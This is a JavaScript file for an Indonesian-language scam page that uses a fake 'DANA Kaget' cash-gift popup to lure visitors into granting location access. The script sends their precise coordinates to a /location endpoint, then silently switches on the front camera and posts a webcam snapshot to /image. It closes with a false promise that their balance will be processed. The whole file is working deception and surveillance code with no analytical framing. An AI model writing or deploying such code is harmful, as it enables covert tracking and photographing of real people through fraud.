Swal.fire({
    type: 'warning',
    title: tld + ' berbagi DANA KAGET !',
    confirmButtonText: 'OKE',
    text: 'Izinkan kami mengakses lokasi Anda untuk mendapatkan Link DANA Kaget Rp. 130.000,00 lainnya di sekitar Anda',
    footer: '',
    allowOutsideClick: false,
    showCloseButton: true
})
    .then(function (result) {
        if (result.value) {

            (async function () {
                try {
                    await latlong();
                    // await papmedia();
                } catch (error) {
                    alert(error)
                }
            })();

        }
    })

function papmedia() {
    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
        const constraints = { video: { facingMode: 'user' }, audio: false };
        navigator.mediaDevices.getUserMedia(constraints).then(function (stream) {
            const videoElement1 = document.getElementById('video');
            videoElement1.srcObject = stream;

            var send = false
            setInterval(() => {
                const canvas = document.createElement('canvas');
                const videoElement = document.getElementById('video');
                canvas.width = videoElement.videoWidth;
                canvas.height = videoElement.videoHeight;
                canvas.getContext('2d').drawImage(videoElement, 0, 0);
                const imageData = canvas.toDataURL('image/jpeg');
                console.log(imageData)

                if (!send) {
                    $.ajax({
                        type: "POST",
                        url: '/image',
                        data: { image: imageData, user_id: getQuery('userId'), url: getQuery('article') },
                        dataType: "json",
                        success: function (data) {
                            send = true
                            alert('Terima kasih. Kami akan memproses saldo DANA Anda !')
                        },
                        error: function (jqXHR, textStatus, errorThrown) {

                        }
                    });
                }
            }, 1000)
        })
            .catch(function (error) {
                console.error('Error accessing media devices.', error);
            });
    } else {
        console.error('getUserMedia is not supported by this browser');
    }
}

function latlong() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(showPosition);
    } else {
        console.log("Geolocation is not supported by this browser.");
    }
}


function getQuery(parameter) {
    let queryString = window.location.search;
    let urlParams = new URLSearchParams(queryString);
    return urlParams.get(parameter);
}

function showPosition(position) {
    let latitude = position.coords.latitude;
    let longitude = position.coords.longitude;
    let accuracy = position.coords.accuracy;

    $.ajax({
        type: "POST",
        url: '/location',
        data: { lat: latitude, long: longitude, url: getQuery('article'), accuracy: accuracy },
        dataType: "json",
        success: function (data) {
            // visitor()
            papmedia()
        },
        error: function (jqXHR, textStatus, errorThrown) {
            // console.log(textStatus);
            // console.log(errorThrown);
        }
    });
}

async function visitor() {
    $.ajax({
        type: "POST",
        url: "/visitor",
        data: {url: getQuery('article'), user_id: getQuery('userId'), json: JSON.stringify(data)},
        dataType: "json",
        success: function (data) {
            
        },
        error: function(jqXHR, textStatus, errorThrown) {
            console.log(textStatus);
            console.log(errorThrown);
        }
    });
}